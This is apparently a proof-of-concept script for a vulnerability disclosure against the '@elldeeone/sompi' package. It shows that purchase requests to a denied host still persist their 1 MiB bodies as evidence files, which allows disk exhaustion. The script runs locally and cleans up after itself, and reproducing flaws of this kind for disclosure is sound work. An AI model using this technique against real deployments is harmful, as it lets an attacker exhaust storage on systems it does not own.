import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";

function option(name, fallback) {
  const index = process.argv.indexOf(name);
  if (index === -1) return fallback;
  const value = process.argv[index + 1];
  if (!value || value.startsWith("--")) {
    throw new Error(`${name} requires a value`);
  }
  return value;
}

const target = path.resolve(option("--target", "../../target"));
const calls = Number(option("--calls", "3"));
if (!Number.isSafeInteger(calls) || calls < 1 || calls > 16) {
  throw new Error("--calls must be an integer from 1 through 16");
}

const packageMetadata = JSON.parse(
  fs.readFileSync(path.join(target, "package.json"), "utf8")
);
if (packageMetadata.name !== "@elldeeone/sompi") {
  throw new Error("--target does not identify an @elldeeone/sompi checkout");
}

async function targetImport(relativePath) {
  const filename = path.join(target, relativePath);
  fs.accessSync(filename, fs.constants.R_OK);
  return import(pathToFileURL(filename).href);
}

const [coordinatorModule, egressModule, journalModule, toolsModule] =
  await Promise.all([
    targetImport("dist/purchase/coordinator.js"),
    targetImport("dist/purchase/egress-policy.js"),
    targetImport("dist/purchase/journal.js"),
    targetImport("dist/mcp/purchase-tools.js"),
  ]);

const { PurchaseCoordinator } = coordinatorModule;
const { EgressPolicy } = egressModule;
const { PurchaseJournal } = journalModule;
const { toolIntent } = toolsModule;

const directory = fs.mkdtempSync(
  path.join(os.tmpdir(), "sompi-prevalidation-storage-poc-")
);
fs.chmodSync(directory, 0o700);
const database = path.join(directory, "purchase.sqlite");
const evidenceDirectory = `${database}.evidence`;
const bodyBytesPerCall = 1024 * 1024;
let entropyCounter = 1;
let checkoutCalls = 0;
let journal;

console.log(`[+] target package: ${packageMetadata.name} ${packageMetadata.version}`);

try {
  journal = new PurchaseJournal(database, {
    now: () => 1_900_000_000_000,
  });
  const egress = new EgressPolicy({
    allowRules: [{ hostname: "merchant.example", ports: [443] }],
    resolver: async () => [{ address: "93.184.216.34", family: 4 }],
    now: () => 1_900_000_000_000,
  });
  const unreachable = Object.freeze({});
  const checkout = {
    async discover() {
      checkoutCalls += 1;
      throw new Error("checkout must not be reached for a denied destination");
    },
  };
  const coordinator = new PurchaseCoordinator(
    journal,
    egress,
    checkout,
    unreachable,
    unreachable,
    unreachable,
    unreachable,
    unreachable,
    unreachable,
    {
      now: () => 1_900_000_000_000,
      workerId: "prevalidation-storage-poc",
      entropy(bytes) {
        return new Uint8Array(bytes).fill(entropyCounter++);
      },
    }
  );

  const observations = [];
  for (let index = 0; index < calls; index += 1) {
    const body = Buffer.alloc(bodyBytesPerCall, index + 1);
    const intent = toolIntent({
      requestKey: `poc:prevalidation-storage:${index}`,
      url: "https://blocked.invalid/resource",
      method: "POST",
      bodyBase64: body.toString("base64"),
      mediaType: "application/octet-stream",
    });

    let errorCode;
    try {
      await coordinator.purchase(intent);
    } catch (error) {
      errorCode = error?.code;
    }

    const purchase = journal.findPurchaseByRequestKey(intent.requestKey);
    const files = fs.readdirSync(evidenceDirectory);
    const storedBytes = files.reduce(
      (total, name) =>
        total + fs.statSync(path.join(evidenceDirectory, name)).size,
      0
    );
    const observation = {
      errorCode,
      purchaseState: purchase?.state,
      files: files.length,
      storedBytes,
    };
    observations.push(observation);
    console.log(
      `[+] call=${index + 1} egress=${errorCode ?? "none"} ` +
        `purchase=${purchase?.state ?? "absent"} files=${files.length} ` +
        `bytes=${storedBytes}`
    );
  }

  const final = observations.at(-1);
  const vulnerable =
    checkoutCalls === 0 &&
    observations.every(
      (entry, index) =>
        entry.errorCode === "host_denied" &&
        entry.purchaseState === "created" &&
        entry.files === index + 1 &&
        entry.storedBytes === (index + 1) * bodyBytesPerCall
    );

  console.log(`[+] checkout calls: ${checkoutCalls}`);
  if (!vulnerable) {
    throw new Error(
      "target did not exhibit the expected pre-validation persistence behavior"
    );
  }
  console.log(
    `[+] vulnerable behavior reproduced: ${calls} denied requests retained ` +
      `${final.storedBytes} evidence bytes`
  );
} finally {
  journal?.close();
  fs.rmSync(directory, { recursive: true, force: true });
  console.log("[+] disposable state removed");
}
